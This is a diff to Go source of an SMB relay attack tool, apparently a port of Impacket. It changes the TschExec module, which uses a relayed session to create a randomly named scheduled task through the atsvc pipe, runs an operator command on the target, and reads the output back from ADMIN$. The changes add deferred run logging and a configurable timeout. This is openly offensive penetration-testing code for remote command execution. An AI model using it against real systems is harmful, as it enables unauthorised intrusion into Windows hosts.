@@ -140,12 +140,16 @@ func (a *TschExecAttack) Run(session interface{}, config *Config) error {
 
 // tschExecAttack creates a scheduled task to execute a command, runs it, and cleans up.
 // Matches Impacket's TSCHRPCAttack._run() flow.
-func tschExecAttack(client *SMBRelayClient, cfg *Config) error {
+func tschExecAttack(client *SMBRelayClient, cfg *Config) (err error) {
 	if cfg.Command == "" {
 		return fmt.Errorf("no command specified (-c flag)")
 	}
 
-	log.Printf("[*] Executing command on target via Task Scheduler...")
+	// Buffered run log: flushed on exit once the session is established, so
+	// post-auth failures leave a traceable file and auth/session failures do not.
+	host := hostFromAddr(client.TargetAddr)
+	rl := &runLog{}
+	defer func() { rl.Flush(cfg, host, "tschexec", cfg.Command, err) }()
 
 	// Connect to IPC$ and open atsvc pipe (ITaskSchedulerService)
 	if err := client.TreeConnect("IPC$"); err != nil {
@@ -184,8 +188,7 @@ func tschExecAttack(client *SMBRelayClient, cfg *Config) error {
 	outFile := randomName() + ".tmp"
 	remoteOut := "Temp\\" + outFile // relative to ADMIN$ (= %SystemRoot%)
 
-	rl := &runLog{}
-	rl.Printf("[*] Executing command on target via Task Scheduler...")
+	rl.Printf("[*] Executing command via Task Scheduler on %s...", host)
 
 	// Generate random task name
 	taskName := "\\" + randomName()
@@ -216,9 +219,14 @@ func tschExecAttack(client *SMBRelayClient, cfg *Config) error {
 
 	// Poll for the output file until the completion marker appears (the file is
 	// created at command start, so existence alone does not mean it finished).
+	wait := cfg.CmdTimeout
+	if wait <= 0 {
+		wait = 10 * time.Second
+	}
+	deadline := time.Now().Add(wait)
 	var output []byte
 	found := false
-	for i := 0; i < 20; i++ {
+	for time.Now().Before(deadline) {
 		time.Sleep(500 * time.Millisecond)
 		data, derr := client.DownloadFile("ADMIN$", remoteOut)
 		if derr != nil {
@@ -265,7 +273,6 @@ func tschExecAttack(client *SMBRelayClient, cfg *Config) error {
 	} else {
 		rl.Printf("[*] Command executed (no output)")
 	}
-	rl.Flush(cfg, hostFromAddr(client.TargetAddr), "tschexec", cfg.Command)
 
 	return nil
 }
